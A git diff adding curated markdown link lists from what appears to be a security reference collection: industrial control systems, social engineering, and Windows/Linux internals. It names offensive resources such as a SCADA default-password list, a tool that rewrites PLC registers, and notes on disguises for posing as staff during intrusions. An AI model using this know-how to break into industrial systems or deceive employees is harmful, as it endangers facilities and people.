+* [Making prawn espressos, or hacking ships by deciphering BAPLIE EDIFACT messaging](https://www.pentestpartners.com/security-blog/making-prawn-espressos-or-hacking-ships-by-deciphering-baplie-edifact-messaging/)
+* [BAPLIE](http://www.portofantwerp.com/apcs/en/node/449)
+
+  * The BAPLIE message is a widely used EDIFACT message in the shipping
+    industry. It is used by and between various parties to advise the exact
+    stowage positions of the cargo on board of an ocean vessel. It is currently
+    chiefly used for container cargo. Besides the container number and the exact
+    position on board, general information regarding the containers is also
+    specified such as weight and hazardous cargo class.
+
+#### Learning
+
+* [Control System Basics](https://www.youtube.com/watch?v=VQLRVjEFRGI)
+* [PLC Training Org](http://plc-training.org/plc-network-to-hmi-scada.html)
+* [Serial Communication RS232 & RS485](https://www.youtube.com/watch?v=2DQdEHvnqvI)
+* [How Ethernet TCP/IP is Used by Industrial Protocols](https://www.youtube.com/watch?v=DL_zIjhCEpU)
+* [SCADA Systems - Utility 101 Session with Rusty Wiliiams](https://www.youtube.com/watch?v=vv2CoTiaWPI)
+* [Control System Lectures - Brian Douglas - youtube channel](https://www.youtube.com/user/ControlLectures/about)
+
+  * Welcome to Control Systems Lectures!  This collection of videos is intended to supplement a first year controls class, not replace it.  My goal is to take specific concepts in controls and expand on them in order to provide an intuitive understanding which will ultimately make you a better controls engineer.
+
+* [plcprofessor - youtube channel](https://www.youtube.com/user/plcprofessor)
+
+  *  The PLC Professor YouTube Channel is solely dedicated to technical education, specifically industrial control systems and their supporting technologies. The "Complete PLCLearn Series" is comprised of lectures, hands on lab projects and lab project wrap up discussions. The playlists to use for the series are titled "Lectures", "Basics" lab discussions, "Advanced I" lab discussions and "Advanced II" lab discussions. There is also a "Support" playlist for miscellaneous supporting knowledge, "RSLogix5000", "How to Program", as well as many more to come. These lectures and lab projects were developed for actual classroom training and have been improved as hundreds of electricians and engineers completed and commented on the content.
+
+* [Damn Vulnerable Chemical Process](https://www.slideshare.net/phdays/damn-vulnerable-chemical-process)
+* [Hacking Chemical Plants for Competition and Extortion - Marina Krotofil - HITBGSEC 2015](https://www.youtube.com/watch?v=0B-sG1rKJ2U)
+
+### Modbus
+
+* [Modbus Stager: Using PLCs as a payload/shellcode distribution system](http://www.shelliscoming.com/2016/12/modbus-stager-using-plcs-as.html)
+* [All You Need to Know About Modbus RTU](https://www.youtube.com/watch?v=OvRD2UvrHjE)
+* [All You need to know about Modbus TCP](https://www.youtube.com/watch?v=E1nsgukeKKA)
+* [Modbus Data structure](https://www.youtube.com/watch?v=8FYFai21JPA)
+
+### Tools
+
+* General Tools
+
+  * [python-opcua](https://github.com/FreeOpcUa/python-opcua/blob/master/README.md)
+    * OPC UA binary protocol implementation is quasi complete and has been
+      tested against many different OPC UA stacks. API offers both a low level
+      interface to send and receive all UA defined structures and high level
+      classes allowing to write a server or a client in a few lines. It is easy
+      to mix high level objects and low level UA calls in one application.
+  * [UaExpert—A Full-Featured OPC UA Client](https://www.unified-automation.com/products/development-tools/uaexpert.html)
+    * The UaExpert® is a full-featured OPC UA Client demonstrating the
+      capabilities of our C++ OPC UA Client SDK/Toolkit. The UaExpert is
+      designed as a general purpose test client supporting OPC UA features like
+      DataAccess, Alarms & Conditions, Historical Access and calling of UA
+      Methods. The UaExpert is a cross-platform OPC UA test client programmed in
+      C++. It uses the sophisticated GUI library QT form Nokia (formerly
+      Trolltech) forming the basic framework which is extendable by Plugins.
+  * [dyode](https://github.com/arnaudsoullie/dyode)
+    * A low-cost data diode, aimed at Industrial Control Systems
+  * [GRASSMARLIN](https://github.com/iadgov/GRASSMARLIN)
+  * [Moki Linux](https://github.com/moki-ics/moki)
+    * Moki is a modification of Kali to encorporate various ICS/SCADA Tools
+      scattered around the internet, to create a customized Kali Linux geared
+      towards ICS/SCADA pentesting professionals.
+
+* Honeypots
+
+  * [T-Pot](https://dtag-dev-sec.github.io/mediator/feature/2016/03/11/t-pot-16.03.html)
+    * T-Pot 16.03 - Enhanced Multi-Honeypot Platform
+  * [Conpot](https://github.com/mushorg/conpot)
+    * Conpot is an ICS honeypot with the goal to collect intelligence about the
+      motives and methods of adversaries targeting industrial control systems
+
+* Passwords
+
+  * [SCADAPASS](https://github.com/scadastrangelove/SCADAPASS)
+    * SCADA StrangeLove Default/Hardcoded Passwords List
+
+* Simulation Software
+
+  * [MiniCPS](https://github.com/scy-phy/minicps)
+    * MiniCPS is a framework for Cyber-Physical Systems real-time simulation. It
+      includes support for physical process and control devices simulation, and
+      network emulation. It is build on top of mininet.
+  * [Simulated Physics And Embedded Virtualization Integration (SPAEVI) - Overview](http://www.spaevi.org/p/the-simulated-physics-and-embedded.html)
+
+* Testing Tools
+
+  * [smod - MODBUS Penetration Testing Framework](https://github.com/enddo/smod)
+    * smod is a modular framework with every kind of diagnostic and offensive
+      feature you could need in order to pentest modbus protocol. It is a full
+      Modbus protocol implementation using Python and Scapy. This software could
+      be run on Linux/OSX under python 2.7.x.
+  * [SCADA Shutdown Tool](https://github.com/0xICF/SCADAShutdownTool)
+    * SCADAShutdownTool is an industrial control system automation and testing
+      tool allows security researchers and experts to test SCADA security
+      systems, enumerate slave controllers, read controller's registers values
+      and rewrite registers data. SCADAShutdownTool allow enumeration of all
+      registers types of a controller include coil outputs, digital inputs,
+      analogue inputs, holding registers and extended registers.
+  * [Redpoint](https://github.com/digitalbond/Redpoint)
+  * Digital Bond's ICS Enumeration Tools
+
+* Testing
+
+  * [ICS Security Assessment Methodology, Tools & Tips](https://www.youtube.com/watch?v=0WoA9SYLDoM)
+    * Dale Peterson of Digital Bond describes how to perform an ICS / SCADA
+      cyber security assessment in this S4xJapan video. He goes into a lot of
+      detail on the tools and how to use them in the fragile and insecure by
+      design environment that is an ICS. There are also useful tips on when to
+      bother applying security patches (this will likely surprise you), the
+      importance of identifying the impact of a vulnerability, and an efficient
+      risk reduction approach.
diff --git a/source/Social-Engineering.md b/source/Social-Engineering.md
new file mode 100644
index 0000000..5f853d4
--- /dev/null
+++ b/source/Social-Engineering.md
@@ -0,0 +1,277 @@
+# Social Engineering
+
+##### TOC
+
+* [Articles](#articles)
+* [Books](#books)
+* [Presentations](#talks)
+* [Papers](#papers)
+* [Tools](#tools)
+
+### To-do
+
+* http://www.ncbi.nlm.nih.gov/pmc/articles/PMC3152826/
+
+### Articles
+
+* [Source Handling](http://guerrillamerica.com/2014/01/source-handling-part-one/)
+* [Source Recruitment](http://guerrillamerica.com/2013/12/source-recruitment/)
+* [List of the 48 Laws of Power](http://cgt411.tech.purdue.edu/covey/48_laws_of_power.htm)
+* [Influence: Book notes](http://www.2uo.de/influence/)
+* [DiSC Overview](https://www.discprofile.com/what-is-disc/overview/)
+
+  * DiSC is a personal assessment tool used to improve work productivity,
+    teamwork and communication. DiSC is non-judgmental and helps people discuss
+    their behavioral differences.
+
+* [The Social Engineering Framework](http://www.social-engineer.org/framework/general-discussion/)
+
+  * The Social Engineering Framework is a searchable information resource for
+    people wishing to learn more about the psychological, physical and
+    historical aspects of social engineering.
+
+* [Phishing Family Tree Now: A Social Engineering Odyssey](https://www.blackhillsinfosec.com/?p=5629)
+
+### Books
+
+* [Toastmaster's guide to body language](http://westsidetoastmasters.com/resources/book_of_body_language/toc.html)
+* Miss Manners Guide to Excellent Manners
+* [Influence: Science and Practice](https://en.wikipedia.org/wiki/Influence:_Science_and_Practice)
+* Art of Deception
+* Social Engineering: Art of Human Hacking
+* Anything by Paul Eckman and his research
+* What Every Body is saying
+* Art of the Steal
+* Craft of Intelligence
+* How to Win Friends and Influence People
+* Thank You For Arguing, Revised and Updated Edition: What Aristotle, Lincoln,
+  And Homer Simpson Can Teach Us About the Art of Persuasion
+* [The Amy Vanderbilt Complete Book of Etiquette](https://www.archive.org/stream/amyvanderbiltsco00vandrich/amyvanderbiltsco00vandrich_djvu.txt)
+* Propaganda by Edward Bernays
+* Art of War by Sun Tzu
+* Language Intelligence: Lessons on persuasion from Jesus, Shakespeare, Lincoln,
+  and Lady Gaga
+* The Prince by Machiavelli
+* The Definitive Book of Body Language - Barbara pease
+* 48 Laws of Power
+* Thinking Fast and Slow
+* Unmasking the Social Engineer: The Human Element of Security
+* Emotions Revealed, Second Edition: Recognizing Faces and Feelings to Improve
+  Communication and Emotional Life
+* Influence Without Authority
+
+### Presentations:
+
+* [Total Fail: and Bad Mistakes, I've Made a Few- Jayson Street -DEF CON 24 SE Village](https://www.youtube.com/watch?v=l1OFH_H8PjQ)
+* [Social Engineering Like In Movies -- Reality of awareness and manipulation - Dale Pearson- #days](https://www.youtube.com/watch?v=XUIWi5p0oFI)
+* [Manipulating Human Minds: The Psychological Side of Social Engineering - Christina Camilleri - CrikeyCon](https://www.youtube.com/watch?v=8enkIWl79_4)
+* [Psychological Tricks of the Social Engineer - William Tarkington - GrrCON2012](https://www.youtube.com/watch?v=bk-TK4MPs8s&index=10&list=PL_At9BlHdC-_764ciDVexbJL0hwsCzqLK)
+
+  * While several Social Engineering talks and books focus on the techniques no
+    one clearly explains why they work. Learn why the techniques are used and
+    what impact they have on behavior. Discover aspects of human social
+    interaction that can be leveraged to accomplish discrete and specific goals.
+    Gain a firm understanding of the limitations of humans objective reasoning.
+    Finally understand the social rules that are used to navigate within the
+    social engineering construct.
+
+* [Social Engineering: The Good, the Bad, and the Ugly -- Stephanie Carruthers ](https://www.youtube.com/watch?v=9wCrUOYQlCI&index=31&list=PL_At9BlHdC-_764ciDVexbJL0hwsCzqLK)
+* [Deceiving the heavens to cross the sea - Jayson E Street - Defcon18](https://www.youtube.com/watch?v=EzGwO5L9oq4&feature=player_embedded)
+* [How I met your girlfriend - Samy Kamkar - Defcon18](https://www.youtube.com/watch?v=YDW7kobM6Ik)
+* [Steal Everything, Kill Everyone, Cause Total Financial Ruin!](https://www.youtube.com/watch?v=JsVtHqICeKE)
+
+  * This is not a presentation where I talk about how I would get in or the
+    things I might be able to do. This is a talk where I am already in and I
+    show you pictures from actual engagements that I have been on. They say one
+    picture is worth a thousand words I show you how one picture cost a company
+    a million dollars and maybe even a few lives. In a community where we focus
+    so much on the offensive I also make sure with every attack I highlight. I
+    spend time discussing what would have stopped me. We need to know the
+    problems but we need more talks providing solutions and that is what I hope
+    people will get from this. I show the dangers of Social engineering and how
+    even an employee with no SE experience can be an eBay James Bond which can
+    cause total financial ruin to a company. These Security threats are real. So
+    are these stories!
+
+* [For The Win Tools Techniques to Maximize Effectiveness of Your Social Engineering Attacks - Joe Gray](https://www.youtube.com/watch?v=Jh9Kl4JAdEA)
+* [PG01 Dropping hell0days Business Interaction for Security Professionals Or Anyone Else Elliot Johnso ](https://www.youtube.com/watch?v=COyN3NwY1v0)
+* [Social Engineering: The Gentleman Thief - Apollo Robins - Defcon21](https://www.youtube.com/watch?v=1kkOKvPrdZ4)
+* [Go With the Flow Strategies for Successful Social Engineering - Chris Silvers](https://www.youtube.com/watch?v=Lfm1mBrcuhY&feature=player_embedded)
+* [The Dirty South - David Kennedy and Nick Hitchcock - Defcon21](https://www.youtube.com/watch?v=dJbm8Eh-880&index=22&list=PLMcNSdhdNcP1RZDn1GtTETHtAN3I6-M-r)
+
+  * It seems that every day there's a new NextGen firewall, whitelisting and
+    blacklisting, DLP, or the latest technology thats suppose to stop us. But
+    does it really stop "hackers"? Truth is, naw not really. In this talk we'll
+    be showing off the latest bypass techniques for the "latest" hacker
+    stoppers, using a universally whitelisted website as our middle man for a
+    command and control, social engineering our way into some of the toughest
+    companies, and showing off some techniques that work for us. This talk is
+    about throwing misconceptions of protection and safety out the window, and
+    going back the dirty south. Where thinking outside of the box is a
+    requirement. We'll be releasing two new tools, one that makes meterpreter
+    invisible over the network, and the other a shell that uses a popular third
+    party as the command and control. A vulnerability scanner won't help you
+    herrrrrrre.
+
+* [No-Tech Hacking - Hacking without a Computer - Johnny Long](https://www.youtube.com/watch?v=N4kfsxF8Tio)
+* [The Science of Social Engineering: NLP, Hypnosis and the science of persuasion-Defcon15](https://www.youtube.com/watch?v=vk-IrvrC2fo)
+* [Beyond Social Engineering: Tools for Reinventing Yourself - Defcon14](https://www.youtube.com/watch?v=S-FPJ6lpRYU)
+
+  * Managing multiple modular identities is not a trivial task. But that's what
+    the technologies and politics of Now demand. These tools will enable you to
+    create personas at a deep level, then link them into a seamless life.
+
+* [Pwning People Personally - Josh Schwartz](https://www.youtube.com/watch?v=T2Ha-ZLZTz0)
+* [Area41 2016: Dominique-Cédric Brack: Professional Social Engineering](https://youtu.be/NcpmhsSVzuM)
+* [Social Engineering: When the Phone is More Dangerous than Malware](https://www.youtube.com/watch?v=fui9AVpp1wo)
+
+  * Is social engineering (SE) the most dangerous security threat to your
+    business? The Social-Engineer team will analyze current trends in social
+    engineering through the official (and unofficial) results from the DefCon 21
+    Social Engineering Capture the Flag event. They will reveal how these
+    attacks work, the latest social engineering research and how to use this
+    information to protect organizations.
+
+* [What Your Body Tells Me - Body Language for the SE](https://media.defcon.org/DEF%20CON%2022/DEF%20CON%2022%20video%20and%20slides/DEF%20CON%2022%20Hacking%20Conference%20Presentation%20By%20Chris%20Hadnagy%20-%20What%20Your%20Body%20Tells%20Me%20-%20Body%20Language%20for%20the%20SE%20-%20Video%20and%20Slides.m4v)
+* [Manipulating Human Minds: The Psychological Side of Social Engineering - Christina Camilleri - CrikeyCon](https://www.youtube.com/watch?v=8enkIWl79_4)
+* [Social Engineering Like In Movies -- Reality of awareness and manipulation - Dale Pearson](https://www.youtube.com/watch?v=XUIWi5p0oFI)
+* [How do you Feel about your Mother? Psych and The SE - Michele Fincher](https://www.youtube.com/watch?v=A0_NL1YBvK4)
+* [DEF CON 11 Hacking Conference Presentation By Panel - Social Engineering Fundamentals](https://www.youtube.com/watch?v=Pcrmpevn5K0&index=12&list=PLMcNSdhdNcP1RZDn1GtTETHtAN3I6-M-r)
+
+* [Social Engineering Defense Contractors on LinkedIn and Facebook ](https://www.youtube.com/watch?v=L5qETnAKe7A&index=24&list=PLMcNSdhdNcP1RZDn1GtTETHtAN3I6-M-r)
+
+* [Social Engineering, or "hacking people" - DefCamp 2014](https://www.youtube.com/watch?v=JAOTRgWdPTU&index=49&list=PL_At9BlHdC-_764ciDVexbJL0hwsCzqLK)
+* [The Future of Social Engineering - Sharon Conheady - DeepSec2010](https://www.youtube.com/watch?v=aVIq9mdVHlc&index=11&list=PL_At9BlHdC-_764ciDVexbJL0hwsCzqLK)
+
+  * Social engineering is hitting the headlines more than ever. As computer
+    security becomes more sophisticated, hackers are combining their technical
+    expertise with social engineering to gain access to IT infrastructures and
+    critical information. In any security programme people are the weakest link.
+    It can often be easier and quicker to target the end user than using
+    technical hacking techniques. When you combine both social engineering and
+    traditional hacking techniques, you have an extremely dangerous attack. So
+    what's next on the social engineering agenda? What are the emerging trends
+    and what social engineering techniques might we expect to see in the future?
+    In this talk, I will give an overview of the types of social engineering
+    attacks people have used throughout the ages, from tricks used by the
+    classic conmen of the past to the phishing attacks that are at an all time
+    high, and the proliferation of social networking and how useful this is to
+    social engineers. I will describe some of the new social engineering
+    techniques and trends that are emerging and discuss war stories from my
+    experience of social engineering, describing techniques I have used to gain
+    access to sensitive information
+
+* [BSidesSF 2016 - The Art of the Jedi Mind Trick (Jeff Man) ](https://www.youtube.com/watch?v=3L5_Kaps5t4)
+* [Pwning People Personally](http://www.irongeek.com/i.php?page=videos/derbycon5/break-me08-pwning-people-personally-josh-schwartz)
+* [Security Guards LOL Brent White Tim Roberts - Nolacon2017](https://www.youtube.com/watch?v=yIQ-7ZSwrYw)
+* [Jedi Mind Tricks: People Skills for Security Pros - Alex DiPerma - 2017 ANYCON](http://www.irongeek.com/i.php?page=videos/anycon2017/104-jedi-mind-tricks-people-skills-for-security-pros-alex-diperna)
+
+  * People skills for security professionals but WAY MORE FUN!
+
+* [PG12 Classic Misdirection Social Engineering to Counter Surveillance Peter Clemenko III](https://www.youtube.com/watch?v=AysOwnSUmgg)
+* [Patching the Human Vulns - Leonard Isham](http://www.irongeek.com/i.php?page=videos/derbycon4/t300-patching-the-human-vulns-leonard-isham)
+
+  * You are a hacker, you learn, you play, and you break. The very nature of a
+    hacker is to question what is given to us and to play with the rules.
+    However, most of us do not apply this methodology in all parts of our lives.
+    Many take what is given to us about mood and health as fact and what are the
+    results...overweight, depression, anxiety, and self esteem issues. In this
+    presentation, we will show 2 hackers and their journey on how they addressed
+    the issues mentioned above. Len and Moey followed two separate paths to
+    losing over a combined 150 lbs, gaining confidence, and changing their
+    outlook. The talk will not only cover the touchy feely portion of how to
+    deal with weight, mood,and self esteem but will also be supported by the
+    science behind diets, supplements and perspective. The talk will provide
+    what worked for two hackers. YMMV.
+
+* [Cheat Codez: Level UP Your SE Game - Eric Smith (@InfoSecMafia)](http://www.irongeek.com/i.php?page=videos/derbycon3/1206-cheat-codez-level-up-your-se-game-eric-smith)
+
+  * Everyone knows what phishing is. Everyone realizes Java applets lead to
+    massive storms of shells. Everyone accepts tailgating is the easiest way
+    into your building. Everyone knows smoking (areas) are bad for you AND your
+    business. Admit it, you paid for that EXACT assessment last year. I could
+    write your report for you without even doing the job. So what’s the problem
+    you ask? That’s EXACTLY the problem, I say. So how do we fix these issues
+    that plague our industry and misalign business expectations? This talk will
+    discuss the value of Social Engineering exercises when conducted with
+    realistic goals yielding actionable results. Of course, that means putting
+    in REAL work throughout the engagement, not “point, click, report, rinse and
+    repeat”. We’ll discuss tips, techniques and secrets that the PROS don’t
+    always blog about. _PRO TIP_ – This won’t be a talk on how to use a
+    particular framework or release of a tool (there are plenty of those
+    already). So bring your work boots, it’s time to get dirty and UP your game.
+
+* ["Humans, right?" Soft Skills in Security - Ariel Robinson](http://www.irongeek.com/i.php?page=videos/bsidesnova2017/200-humans-right-soft-skills-in-security-ariel-robinson)
+
+  * Let's face it: humans ruin everything. They are almost always the weak link
+    in the information security chain, between their susceptibility to social
+    engineering, rejection of security threats, and sheer laziness. You can make
+    the best security tool in the business, but if a human doesn't use it right,
+    well, you might as well leave your passwords on a sticky note on your-- wait
+    a minute. Yes, humans suck at information security. But we don't make it
+    easy. Infosec is incredibly inaccessible to your average user. Just ask me:
+    I am one. We can't change humans (or get rid of them, no matter how much we
+    might want to), but we can change information security. We can leverage
+    insights from non-technical disciplines such as cognitive science,
+    human-centered design, strategic communications, and psychology. Or we can
+    keep hitting our heads against our desktops. As a professional communicator
+    and bridge builder, help me help you. To make security work, we have to make
+    it easy. For humans.
+
+* [**I Will Kill You** - Chris Rock(Defcon23)](https://www.youtube.com/watch?v=9FdHq3WfJg)
+* [Total Fail: and Bad Mistakes, I've Made a Few- Jayson Street -DEF CON 24 SE Village](https://www.youtube.com/watch?v=l1OFH_H8PjQ)
+
+### Disguize - Appearance Hacking
+
+* [Disguise - Appearance Hacking](http://www.irongeek.com/i.php?page=videos/derbycon2/valerie-thomas-appearance-hacking-101-the-art-of-everyday-camouflage)
+* [Transcript](http://www.ted.com/talks/amy_cuddy_your_body_language_shapes_who_you_are/transcript)
+
+My notes from it:
+
+```
+* Why use makeup?
+  *    Blend into crowd
+    *  Pose as employee/vendor
+    *  Regain access if caught
+* Create distraction for teammates
+* Whom to disguise as?
+  *    Technician
+    *  Sales Executive
+* Goodwill
+ *     Employee
+  *    Interview Candidate
+* Easy to see goings on
+ *     Pedestrian
+  *    Sidewalk Sleeper
+* Transform into another person:
+ *     Can take minutes/hours
+   *   Examine each physical attribute
+* Some modified easier than others
+  *    Entire appearance makes the difference. One part is off, whole cover can be blown
+* If using hardhat, make sure to beat the shit out of it. Add stickers.
+```
+
+### Research Papers
+
+* [Construal-Level Theory of Psychological Distance](http://www.ncbi.nlm.nih.gov/pmc/articles/PMC3152826/)
+
+  * Abstract: People are capable of thinking about the future, the past, remote
+    locations, another person’s perspective, and counterfactual alternatives.
+    Without denying the uniqueness of each process, it is proposed that they
+    constitute different forms of traversing psychological distance.
+    Psychological distance is egocentric: Its reference point is the self in the
+    here and now, and the different ways in which an object might be removed
+    from that point—in time, in space, in social distance, and in
+    hypotheticality—constitute different distance dimensions. Transcending the
+    self in the here and now entails mental construal, and the farther removed
+    an object is from direct experience, the higher (more abstract) the level of
+    construal of that object. Supporting this analysis, research shows (a) that
+    the various distances are cognitively related to each other, (b) that they
+    similarly influence and are influenced by level of mental construal, and (c)
+    that they similarly affect prediction, preference, and action.
+
+* [The Neural Basis of Decision-Making During Sensemaking: Implications for Human-System Interaction](https://www.researchgate.net/publication/278679336_The_Neural_Basis_of_Decision-Making_During_Sensemaking_Implications_for_Human-System_Interaction)
+
+### Tools
+
+* [Step7 Open Source Ethernet Communication Suite](http://snap7.sourceforge.net/)
diff --git a/source/System-Internals-Windows-Linux.md b/source/System-Internals-Windows-Linux.md
new file mode 100644
index 0000000..ce26dca
--- /dev/null
+++ b/source/System-Internals-Windows-Linux.md
@@ -0,0 +1,530 @@
+# System Internals of Windows; OS X; Linux; ARM
+
+### TOC
+
+* [General Internals](#general)
+* [Windows Internals](#winternals)
+* Windows
+* [Kerberos / Related](#kerberos)
+* [Linux Internals](#linux)
+* [Windows Reference](#windowsref)
+* [Linux Reference](#linuxref)
+* [OS X Reference](#osx)
+* [ARM Reference](#ARM)
+
+##### To Do:
+
+* Fix ToC so its accurate
+* Split sections into reference material and writeup material(quick vs long
+  reference)
+* Further categorize sections (network vs memory vs exploit mitigations vs
+  feature)
+
+#### Sort
+
+* [Elevate through ShellExecute - msdn](https://blogs.msdn.microsoft.com/vistacompatteam/2006/09/25/elevate-through-shellexecute/)
+* [Waitfor - tehcnet](<https://technet.microsoft.com/en-us/library/cc731613(v=ws.11).aspx?t=1&cn=ZmxleGlibGVfcmVjcw%3D%3D&iid=22f4306f9238443891cea105281cfd3f&uid=150127534&nid=244+289476616>)
+* [Authentication Registry Keys - msdn](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa374737(v=vs.85).aspx>)
+
+  * When it installs a network provider, your application should create the
+    registry keys and values described in this topic. These keys and values
+    provide information to the MPR about the network providers installed on the
+    system. The MPR checks these keys when it starts and loads the network
+    provider DLLs that it finds.
+
+* [MS Shell Revealed](http://archive.msdn.microsoft.com/ShellRevealed/Release/ProjectReleases.aspx?ReleaseId=2871)
+* [BCDEdit /dbgsettings - msdn](<https://msdn.microsoft.com/en-us/library/windows/hardware/ff542187(v=vs.85).aspx>)
+
+## General Internals
+
+* [C Function Call Conventions and the Stack](https://archive.is/o2nD5)
+* [The Anatomy of an Executable](https://github.com/mewrev/dissection)
+* [What a C programmer should know about memory](http://marek.vavrusa.com/c/memory/2015/02/20/memory/)
+* [Linux kernel development(walkthrough)](https://github.com/0xAX/linux-insides/blob/master/Misc/contribute.md)
+* [Event log explanations for various systems(not just windows)](http://eventopedia.cloudapp.net/Events/?/Operating+System)
+* [duartes.org - internals](http://duartes.org/gustavo/blog/category/internals/)
+* [The little book about OS development](https://littleosbook.github.io/)
+* [How to Make a Computer Operating System in C++](https://github.com/SamyPesse/How-to-Make-a-Computer-Operating-System)
+
+## Windows Reference
+
+### Winternals Windows Internals
+
+* [theForger's Win32 API Programming Tutorial](http://www.winprog.org/tutorial/)
+* [x86 Disassembly/Windows Executable Files - WikiBooks](https://en.wikibooks.org/wiki/X86_Disassembly/Windows_Executable_Files)
+* [WinAPIs for Hackers](https://www.bnxnet.com/wp-content/uploads/2015/01/WinAPIs_for_hackers.pdf)
+* [About Atom Tables](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms649053(v=vs.85).aspx>)
+* [GlobalGetAtomName function](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms649063(v=vs.85).aspx>)
+* [windows-operating-system-archaeology](https://github.com/subTee/windows-operating-system-archaeology)
+
+  * subTee stuff
+
+* [BATTLE OF SKM AND IUM - How Windows 10 rewrites OS Architecture - Alex Ionescu](http://www.alex-ionescu.com/blackhat2015.pdf)
+* [RtlEncryptMemory function](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa387693(v=vs.85).aspx>)
+* [RtlDecryptMemory function](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa387692(v=vs.85).aspx>)
+
+#### Access Control
+
+* [Mandatory Integrity Control](<https://msdn.microsoft.com/en-gb/library/windows/desktop/bb648648(v=vs.85).aspx>)
+* [Windows Access Control Demystified](http://citeseerx.ist.psu.edu/viewdoc/download;jsessionid=E1A09F166B29C17D2CD38C70A02576E4?doi=10.1.1.88.1930&rep=rep1&type=pdf)
+
+##### App Containers
+
+* [Demystifying AppContainers in Windows 8 (Part I)](https://blog.nextxpert.com/2013/01/31/demystifying-appcontainers-in-windows-8-part-i/)
+* [AppContainer Isolation](<https://msdn.microsoft.com/en-us/library/windows/desktop/mt595898(v=vs.85).aspx>)
+
+#### Credential Provider
+
+* [Credential Providers in Windows 10 - msdn](<https://msdn.microsoft.com/en-us/library/windows/desktop/mt158211(v=vs.85).aspx>)
+* [ICredentialProvider interface - msdn](<https://msdn.microsoft.com/en-us/library/bb776042(v=vs.85).aspx>)
+
+  * Exposes methods used in the setup and manipulation of a credential provider.
+    All credential providers must implement this interface.
+
+* [Windows Interactive Logon Architecture - technet](<https://technet.microsoft.com/en-us/library/ff404303(v=ws.10)>)
+* [Winlogon and Credential Providers](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb648647(v=vs.85).aspx>)
+
+  * Winlogon is the Windows module that performs interactive logon for a logon
+    session. Winlogon behavior can be customized by implementing and registering
+    a Credential Provider.
+
+* [Registering Network Providers and Credential Managers - msdn](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa379389(v=vs.85).aspx>)
+* [V2 Credential Provider Sample - code.msdn](https://code.msdn.microsoft.com/windowsapps/V2-Credential-Provider-7549a730)
+
+  * Demonstrates how to build a v2 credential provider that makes use of the new
+    capabilities introduced to credential provider framework in Windows 8 and
+    Windows 8.1.
+
+* [Custom Credential Provider for Password Reset - blogs.technet](https://blogs.technet.microsoft.com/aho/2009/11/14/custom-credential-provider-for-password-reset/)
+* [Starting to build your own Credential Provider](https://blogs.msmvps.com/alunj/2011/02/21/starting-to-build-your-own-credential-provider/)
+
+  * If you’re starting to work on a Credential Provider (CredProv or CP, for
+    short) for Windows Vista, Windows Server 2008, Windows Server 2008 R2 or
+    Windows 7, there are a few steps I would strongly recommend you take,
+    because it will make life easier for you.
+
+#### Documentation
+
+* [AppInit_DLLs in Windows 7 and Windows Server 2008 R2](<https://msdn.microsoft.com/en-us/library/windows/desktop/dd744762(v=vs.85).aspx>)
+* [Antimalware Scan Interface Reference](<https://msdn.microsoft.com/en-us/library/windows/desktop/dn889588(v=vs.85).aspx>)
+* [Minimal COM object registration](https://blogs.msdn.microsoft.com/larryosterman/2006/01/05/minimal-com-object-registration/)
+* [Windows Data Protection](https://msdn.microsoft.com/en-us/library/ms995355.aspx)
+* [The Component Object Model](https://msdn.microsoft.com/library/ms694363.aspx)
+
+##### Emojis/Fonts/Encoding
+
+* [Introducing Character Sets and Encodings - W3C](https://www.w3.org/International/getting-started/characters)
+* [An Introduction to Writing Systems & Unicode](https://r12a.github.io/scripts/tutorial/)
+* [Tifinagh - Wikipedia](https://en.m.wikipedia.org/wiki/Tifinagh)
+* [Core Text - apple](https://developer.apple.com/documentation/coretext)
+* [Full Emoji List - Unicode.org](https://unicode.org/emoji/charts/full-emoji-list.html)
+* [List of XML and HTML character entity references - Wikipedia](https://en.m.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references)
+* [Ambiguous ampersands](https://mathiasbynens.be/notes/ambiguous-ampersands)
+* [Everything You Need To Know About Emoji ??](https://www.smashingmagazine.com/2016/11/character-sets-encoding-emoji/)
+* [Emoji and Pictographs - FAQ - unicode.org](https://unicode.org/faq/emoji_dingbats.html)
+* [Unicode® Emoji](https://www.unicode.org/emoji/)
+
+  * This page provides information about Unicode emoji and their development.
+
+* [Emojipedia](https://emojipedia.org/)
+
+  * Emoji Meanings
+
+##### Exchange Web Services
+
+* [Start using web services in Exchange - msdn 2017](<https://msdn.microsoft.com/en-us/library/office/jj900168(v=exchg.150).aspx>)
+* [Exchange Web Services Overview - TechEd](https://www.youtube.com/watch?v=wOQMJhrp6GQ)
+
+##### Exploit Mitigations
+
+* [Compiler Security Checks In Depth - MSDN Library](https://msdn.microsoft.com/library/aa290051.aspx)
+* [A Crash Course on the Depths of Win32™ Structured Exception Handling](https://www.microsoft.com/msj/0197/exception/exception.aspx)
+* [Antimalware Scan Interface Reference](https://msdn.microsoft.com/en-us/library/windows/desktop/dn889588)
+
+  * Prevents certain kinds of Powershell attacks
+
+* [Compiler Security Checks In Depth - MSDN Library](https://msdn.microsoft.com/library/aa290051.aspx)
+
+##### HTML Applications
+
+[HTML Applications - msdn](<https://msdn.microsoft.com/en-us/library/ms536471(VS.85).aspx>)
+
+* HTML Applications (HTAs) are full-fledged applications. These applications are
+  trusted and display only the menus, icons, toolbars, and title information
+  that the Web developer creates. In short, HTAs pack all the power of Windows
+  Internet Explorer—its object model, performance, rendering power, protocol
+  support, and channel–download technology—without enforcing the strict security
+  model and user interface of the browser. HTAs can be created using the HTML
+  and Dynamic HTML (DHTML) that you already know.
+
+##### Memory
+
+* [Pushing the Limits of Windows: Virtual Memory](http://blogs.technet.com/b/markrussinovich/archive/2008/11/17/3155406.aspx)
+* [Memory Translation and Segmentation](http://duartes.org/gustavo/blog/post/memory-translation-and-segmentation/)
+* [Exploring Windows virtual memory management](http://www.triplefault.io/2017/08/exploring-windows-virtual-memory.html)
+
+##### Networking
+
+* [WinHTTP](https://msdn.microsoft.com/en-us/library/windows/desktop/aa382925%28v=vs.85%29.aspx)
+* [WinINet](https://msdn.microsoft.com/en-us/library/windows/desktop/aa383630%28v=vs.85%29.aspx)
+* [WinINet vs WinHTTP](https://msdn.microsoft.com/en-us/library/windows/desktop/hh227298%28v=vs.85%29.aspx)
+
+##### PE32/Processes/Threads/etc
+
